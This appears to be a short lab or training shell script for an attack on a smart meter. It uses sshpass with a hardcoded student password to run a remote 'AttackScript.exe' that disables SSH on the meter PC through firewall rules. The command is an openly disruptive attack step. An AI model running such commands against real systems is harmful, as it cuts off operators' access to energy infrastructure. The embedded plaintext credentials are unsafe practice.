#!/bin/sh

# Description: This file/script demostrates the disabling SSH (port 22) on the Smart Meter PC via Windows Firewall Rules
# Tag: Block/Disrupt SSH port on Smart Meter PC 
sshpass -p 'Student12345@' ssh -o ConnectTimeout=5 student@172.16.2.223 "C:\Windows\Temp\SmartMetertest\AttackScript.exe 4"
